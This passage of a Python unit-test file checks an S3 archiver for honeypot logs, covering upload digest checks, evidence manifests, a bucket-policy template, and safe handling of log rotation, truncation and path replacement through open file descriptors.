            "VersionId": "v1",
            "Metadata": {"sha256": digest},
        }
        with self.assertRaisesRegex(RuntimeError, "body digest mismatch"):
            self.run_put(client, data, digest, key)

    def test_get_denial_transient_malformed_and_missing_version_fail_closed(self):
        data, digest, key = self.object_key()
        cases = [
            (
                self.s3_error("AccessDenied", 403, "GetObject"),
                archive.S3AccessError,
            ),
            (
                self.s3_error("ServiceUnavailable", 503, "GetObject"),
                archive.S3TransientError,
            ),
            ({"Body": object(), "VersionId": "v1"}, RuntimeError),
            ({"Body": io.BytesIO(data)}, RuntimeError),
        ]
        for get_result, expected in cases:
            with self.subTest(result=repr(get_result)):
                client = mock.Mock()
                client.put_object.return_value = {"VersionId": "v1"}
                if isinstance(get_result, Exception):
                    client.get_object.side_effect = get_result
                else:
                    client.get_object.return_value = get_result
                with self.assertRaises(expected):
                    self.run_put(client, data, digest, key)

    def test_v2_state_anchor_migrates_without_replaying_advanced_offset(self):
        previous = {
            "version": 2,
            "current": None,
            "lineages": {
                "7:9": {
                    "generation": 0,
                    "offset": 42,
                    "anchor": "a" * 64,
                }
            },
            "rotated": {},
            "uploaded_objects": 1,
            "updated_at": None,
        }
        state_path = mock.Mock()
        state_path.read_text.return_value = json.dumps(previous)
        with mock.patch.object(archive, "STATE_PATH", state_path):
            migrated = archive.load_state()
        self.assertEqual(migrated["version"], 3)
        self.assertEqual(migrated["lineages"]["7:9"]["anchor"]["offset"], 42)
        self.assertEqual(
            migrated["lineages"]["7:9"]["anchor"]["sha256"],
            "a" * 64,
        )

    def test_manifest_records_verified_object_version_and_digest(self):
        data, digest, key = self.object_key()
        writes = {}
        calls = []

        def capture_write(path, body):
            writes[str(path)] = body

        def capture_put(path, object_key, object_digest, content_type):
            calls.append((str(path), object_key, object_digest, content_type))
            return {"VersionId": "evidence-v1", "Existing": len(calls) > 1}

        with mock.patch.object(archive, "write_bytes", side_effect=capture_write), mock.patch.object(
            archive, "put_once", side_effect=capture_put
        ), mock.patch.object(Path, "unlink"):
            response = archive.upload_with_manifest(
                Path("cowrie.json"),
                Path("segment"),
                key,
                digest,
                len(data),
                {"inode": 9, "start_offset": 0, "end_offset": len(data)},
            )
        self.assertEqual(response["VersionId"], "evidence-v1")
        self.assertEqual(calls[1][1], key + ".manifest.json")
        manifest_bytes = next(
            body for path, body in writes.items() if "manifest-" in path
        )
        self.assertEqual(calls[1][2], hashlib.sha256(manifest_bytes).hexdigest())
        manifest = json.loads(manifest_bytes)
        self.assertEqual(manifest["schema"], "patriotpot-evidence-manifest/v3")
        self.assertEqual(manifest["sha256"], digest)
        self.assertEqual(manifest["object_version_id"], "evidence-v1")

    def test_archive_source_has_no_head_list_or_dynamodb_claim(self):
        source = (ROOT / "native" / "s3-archive.py").read_text(encoding="utf-8")
        for forbidden in (
            "head_object",
            "list_objects",
            "list_bucket",
            "dynamodb",
            "acquire_claim",
            "release_claim",
        ):
            self.assertNotIn(forbidden, source.lower())

    def test_bucket_policy_declares_scoped_conditional_header_enforcement(self):
        template = (
            ROOT / "gmu-honeypot-stack-2026-control.yaml"
        ).read_text(encoding="utf-8")
        statement = template.split(
            "- Sid: DenyUnconditionalControlArchiveWrites", 1
        )[1].split("  EvidenceClaimTable:", 1)[0]
        self.assertIn("AWS: !GetAtt PatriotPotInstanceRole.Arn", statement)
        self.assertIn("Action: 's3:PutObject'", statement)
        self.assertIn(
            "/control/${Environment}/sensors/control-0/instances/*/segments/*",
            statement,
        )
        self.assertIn("StringNotEquals:", statement)
        self.assertIn("'s3:if-none-match': '*'", statement)
        self.assertNotIn("bootstrap/", statement)
        self.assertNotIn("bootstrap-diagnostics/", statement)

    def test_segments_are_non_overlapping_and_restart_idempotent(self):
        state = archive.default_state()
        status = self.status(4)
        content = b"a\nb\n"
        uploads = []

        def capture(*args):
            uploads.append(args[5])
            return {"VersionId": "v1", "Existing": False}

        with mock.patch.object(archive.os, "open", return_value=20) as source_open, mock.patch.object(
            archive.os, "fstat", return_value=status
        ), mock.patch.object(
            archive.os, "fdopen", side_effect=lambda *_args, **_kwargs: DescriptorBuffer(content)
        ), mock.patch.object(
            archive, "write_bytes"
        ), mock.patch.object(
            archive, "upload_with_manifest", side_effect=capture
        ), mock.patch.object(
            archive, "save_state"
        ), mock.patch.object(
            Path, "lstat", side_effect=AssertionError("path stat is a TOCTOU regression")
        ):
            # The pathname may have been swapped after open; identity and
            # anchors must come from fd=20 alone, with exactly one open per
            # archive pass and no later pathname re-open.
            archive.archive_path(state, "i-test", Path("cowrie.json"), "current")
            archive.archive_path(state, "i-test", Path("cowrie.json"), "current")
        self.assertEqual(len(uploads), 2)
        self.assertEqual(source_open.call_count, 2)
        self.assertEqual(
            [(item["start_offset"], item["end_offset"]) for item in uploads],
            [(0, 2), (2, 4)],
        )
        self.assertEqual(
            [item["dedupe_key"] for item in uploads],
            ["7:9:0:0:2", "7:9:0:2:4"],
        )
        self.assertEqual(uploads[0]["anchor"]["device"], 7)
        self.assertEqual(uploads[0]["anchor"]["inode"], 9)

    def test_path_is_not_statted_before_opened_descriptor_sets_identity(self):
        state = archive.default_state()
        stale_status = self.status(6, inode=41)
        opened_status = self.status(12, inode=42)
        opened_content = b"replacement\n"
        uploaded = []
        written = []
        path_stat = mock.Mock(return_value=stale_status)
        path_lstat = mock.Mock(return_value=stale_status)
        os_stat = mock.Mock(return_value=stale_status)

        def open_after_replacement(path, _flags):
            self.assertEqual(path, "cowrie.json")
            path_stat.assert_not_called()
            path_lstat.assert_not_called()
            os_stat.assert_not_called()
            return 20

        with mock.patch.object(
            archive.os, "open", side_effect=open_after_replacement
        ) as source_open, mock.patch.object(
            archive.os, "fstat", return_value=opened_status
        ), mock.patch.object(
            archive.os,
            "fdopen",
            return_value=DescriptorBuffer(opened_content),
        ), mock.patch.object(
            archive.os, "stat", os_stat
        ), mock.patch.object(
            Path, "stat", path_stat
        ), mock.patch.object(
            Path, "lstat", path_lstat
        ), mock.patch.object(
            archive,
            "write_bytes",
            side_effect=lambda _path, data: written.append(data),
        ), mock.patch.object(
            archive,
            "upload_with_manifest",
            side_effect=lambda *args: uploaded.append(args[5]) or {"VersionId": "v1"},
        ), mock.patch.object(archive, "save_state"):
            archive.archive_path(state, "i-test", Path("cowrie.json"), "current")

        source_open.assert_called_once()
        path_stat.assert_not_called()
        path_lstat.assert_not_called()
        os_stat.assert_not_called()
        self.assertEqual(written, [opened_content])
        self.assertEqual(set(state["lineages"]), {"7:42"})
        self.assertNotIn("7:41", state["lineages"])
        self.assertEqual(uploaded[0]["inode"], 42)
        self.assertEqual(uploaded[0]["dedupe_key"], "7:42:0:0:12")
        self.assertEqual(
            uploaded[0]["anchor"]["sha256"],
            hashlib.sha256(opened_content).hexdigest(),
        )

    def test_path_replacement_after_open_archives_bound_descriptor_only(self):
        state = archive.default_state()
        original_content = b'{"source":"opened"}\n'
        replacement_content = b'{"source":"replacement"}\n'
        original_status = self.status(len(original_content), inode=51)
        replacement_status = self.status(len(replacement_content), inode=52)
        pathname = {"replacement_visible": False}
        opened_fds = []
        written = []
        uploaded = []

        def open_current(_path, _flags):
            fd = 21 if pathname["replacement_visible"] else 20
            opened_fds.append(fd)
            return fd

        def replace_path_after_first_read(_handle, read_count):
            if read_count == 1:
                pathname["replacement_visible"] = True

        descriptor = TransitioningDescriptorBuffer(
            original_content,
            replace_path_after_first_read,
        )

        def descriptor_status(fd):
            return original_status if fd == 20 else replacement_status

        def descriptor_handle(fd, _mode):
            if fd == 20:
                return descriptor
            return DescriptorBuffer(replacement_content)

        with mock.patch.object(
            archive.os, "open", side_effect=open_current
        ), mock.patch.object(
            archive.os, "fstat", side_effect=descriptor_status
        ) as source_fstat, mock.patch.object(
            archive.os, "fdopen", side_effect=descriptor_handle
        ), mock.patch.object(
            archive,
            "write_bytes",
            side_effect=lambda _path, data: written.append(data),
        ), mock.patch.object(
            archive,
            "upload_with_manifest",
            side_effect=lambda *args: uploaded.append(args[5]) or {"VersionId": "v1"},
        ), mock.patch.object(archive, "save_state"):
            archive.archive_path(state, "i-test", Path("cowrie.json"), "current")

        self.assertTrue(pathname["replacement_visible"])
        self.assertEqual(opened_fds, [20])
        self.assertTrue(all(call.args == (20,) for call in source_fstat.call_args_list))
        self.assertEqual(written, [original_content])
        self.assertEqual(set(state["lineages"]), {"7:51"})
        self.assertEqual(uploaded[0]["inode"], 51)
        self.assertEqual(uploaded[0]["dedupe_key"], f"7:51:0:0:{len(original_content)}")
        self.assertEqual(
            uploaded[0]["anchor"]["sha256"],
            hashlib.sha256(original_content).hexdigest(),
        )

    def test_rename_continuation_does_not_overlap_current_prefix(self):
        state = archive.default_state()
        content = b"a\nb\nc\n"
        state["lineages"]["7:9"] = {
            "generation": 0,
            "offset": 4,
            "anchor": hashlib.sha256(content[:4]).hexdigest(),
        }
        status = self.status(6)
        uploads = []
        with mock.patch.object(archive.os, "open", return_value=20), mock.patch.object(
            archive.os, "fstat", return_value=status
        ), mock.patch.object(
            archive.os, "fdopen", side_effect=lambda *_args, **_kwargs: DescriptorBuffer(content)
        ), mock.patch.object(archive, "write_bytes"), mock.patch.object(
            archive,
            "upload_with_manifest",
            side_effect=lambda *args: uploads.append(args[5]) or {"VersionId": "v2"},
        ), mock.patch.object(archive, "save_state"):
            archive.archive_path(state, "i-test", Path("cowrie.json.1"), "rotated-continuation")
        self.assertEqual((uploads[0]["start_offset"], uploads[0]["end_offset"]), (4, 6))

    def test_copytruncate_during_snapshot_read_resets_without_commit(self):
        state = archive.default_state()
        original_content = b"a\nb\n"
        truncated_content = b"x"
        initial = self.status(len(original_content))
        shrunken = self.status(len(truncated_content))
        copytruncate = {"occurred": False}

        def truncate_after_snapshot_read(handle, read_count):
            if read_count == 2:
                handle.replace_data(truncated_content)
                copytruncate["occurred"] = True

        descriptor = TransitioningDescriptorBuffer(
            original_content,
            truncate_after_snapshot_read,
        )

        def current_status(_fd):
            return shrunken if copytruncate["occurred"] else initial

        with mock.patch.object(archive.os, "open", return_value=20), mock.patch.object(
            archive.os, "fstat", side_effect=current_status
        ), mock.patch.object(
            archive.os, "fdopen", return_value=descriptor
        ), mock.patch.object(archive, "write_bytes") as write, mock.patch.object(
            archive, "upload_with_manifest"
        ) as upload, mock.patch.object(archive, "save_state") as save:
            archive.archive_path(state, "i-test", Path("cowrie.json"), "current")

        self.assertTrue(copytruncate["occurred"])
        self.assertEqual(descriptor.read_count, 2)
        write.assert_not_called()
        upload.assert_not_called()
        self.assertEqual(
            state["lineages"]["7:9"],
            {
                "generation": 1,
                "offset": 0,
                "anchor": None,
                "descriptor": {"device": 7, "inode": 9},
            },
        )
        self.assertIsNone(state["current"])
        self.assertEqual(state["uploaded_objects"], 0)
        save.assert_not_called()

    def test_partial_line_completed_by_lf_on_second_pass_archives_once(self):
        state = archive.default_state()
        partial = b'{"eventid":"completed-later"}'
        complete = partial + b"\n"
        statuses = {
            20: self.status(len(partial)),
            21: self.status(len(complete)),
        }
        contents = {
            20: partial,
            21: complete,
        }
        written = []
        uploads = []
        with mock.patch.object(archive.os, "open", side_effect=[20, 21]), mock.patch.object(
            archive.os, "fstat", side_effect=lambda fd: statuses[fd]
        ), mock.patch.object(
            archive.os,
            "fdopen",
            side_effect=lambda fd, _mode: DescriptorBuffer(contents[fd]),
        ), mock.patch.object(
            archive,
            "write_bytes",
            side_effect=lambda _path, data: written.append(data),
        ), mock.patch.object(
            archive,
            "upload_with_manifest",
            side_effect=lambda *args: uploads.append(args[5]) or {"VersionId": "v1"},
        ), mock.patch.object(archive, "save_state") as save:
            archive.archive_path(state, "i-test", Path("cowrie.json"), "current")
            self.assertEqual(written, [])
            self.assertEqual(uploads, [])
            self.assertEqual(state["lineages"]["7:9"]["offset"], 0)

            archive.archive_path(state, "i-test", Path("cowrie.json"), "current")

        self.assertEqual(written, [complete])
        self.assertEqual(len(uploads), 1)
        self.assertEqual(
            (uploads[0]["start_offset"], uploads[0]["end_offset"]),
            (0, len(complete)),
        )
        self.assertEqual(
            uploads[0]["anchor"]["sha256"],
            hashlib.sha256(complete).hexdigest(),
        )
        self.assertEqual(state["lineages"]["7:9"]["offset"], len(complete))
        save.assert_called_once()

    def test_copytruncate_regrowth_past_saved_offset_archives_new_prefix(self):
        state = archive.default_state()
        old_content = b"old-a\n"
        new_content = b"new-a\nnew-b\n"
        old_offset = len(old_content)
        self.assertGreaterEqual(len(new_content), old_offset)
        state["lineages"]["7:9"] = {
            "generation": 4,
            "offset": old_offset,
            "anchor": hashlib.sha256(old_content).hexdigest(),
            "descriptor": {"device": 7, "inode": 9},
        }
        status = self.status(len(new_content))
        written = []
        uploads = []

        with mock.patch.object(archive.os, "open", return_value=20), mock.patch.object(
            archive.os, "fstat", return_value=status
        ), mock.patch.object(
            archive.os, "fdopen", return_value=DescriptorBuffer(new_content)
        ), mock.patch.object(
            archive,
            "write_bytes",
            side_effect=lambda _path, data: written.append(data),
        ), mock.patch.object(
            archive,
            "upload_with_manifest",
            side_effect=lambda *args: uploads.append(args[5]) or {"VersionId": "v1"},
        ), mock.patch.object(archive, "save_state"):
            archive.archive_path(state, "i-test", Path("cowrie.json"), "current")

        self.assertEqual(written, [b"new-a\n", b"new-b\n"])
        self.assertEqual(
            [(item["start_offset"], item["end_offset"]) for item in uploads],
            [(0, 6), (6, 12)],
        )
        self.assertEqual(
            [item["dedupe_key"] for item in uploads],
            ["7:9:5:0:6", "7:9:5:6:12"],
        )
        self.assertEqual(state["lineages"]["7:9"]["generation"], 5)
        self.assertEqual(state["lineages"]["7:9"]["offset"], len(new_content))

    def test_manifest_failure_retries_the_identical_uncommitted_segment(self):
        state = archive.default_state()
        content = b'{"eventid":"complete"}\n'
        status = self.status(len(content))
        keys = []

        def fail_then_succeed(*args):
            keys.append(args[2])
            if len(keys) == 1:
                raise RuntimeError("manifest upload interrupted")
            return {"VersionId": "v1", "Existing": True}

        with mock.patch.object(archive.os, "open", return_value=20), mock.patch.object(
            archive.os, "fstat", return_value=status
        ), mock.patch.object(
            archive.os, "fdopen", side_effect=lambda *_args, **_kwargs: DescriptorBuffer(content)
        ), mock.patch.object(archive, "write_bytes"), mock.patch.object(
            archive,
            "upload_with_manifest",
            side_effect=fail_then_succeed,
        ), mock.patch.object(archive, "save_state"):
            with self.assertRaisesRegex(RuntimeError, "manifest upload interrupted"):
                archive.archive_path(state, "i-test", Path("cowrie.json"), "current")
            self.assertEqual(state["lineages"]["7:9"]["offset"], 0)
            archive.archive_path(state, "i-test", Path("cowrie.json"), "current")
        self.assertEqual(len(keys), 2)
        self.assertEqual(keys[0], keys[1])
        self.assertEqual(state["lineages"]["7:9"]["offset"], len(content))

    def test_complete_records_accepts_only_lf_terminated_records(self):
        records = list(archive.complete_records(b"one\rtwo\npartial\r"))
        self.assertEqual(records, [(8, b"one\rtwo\n")])

    def test_legacy_rotated_marker_is_checked_from_the_open_descriptor(self):
        content = b'{"eventid":"rotated"}\n'
        status = self.status(len(content))
        marker = (
            f"7:9:{len(content)}:"
            f"{hashlib.sha256(content).hexdigest()}"
        )
        with mock.patch.object(archive.os, "open", return_value=20), mock.patch.object(
            archive.os, "fstat", side_effect=[status, status]
        ), mock.patch.object(
            archive.os, "fdopen", return_value=DescriptorBuffer(content)
        ), mock.patch.object(archive, "upload_with_manifest") as upload:
            archive.archive_path(
                archive.default_state(),
                "i-test",
                Path("cowrie.json.1"),
                "rotated-continuation",
                marker,
            )
        self.assertFalse(upload.called)


if __name__ == "__main__":
    unittest.main()
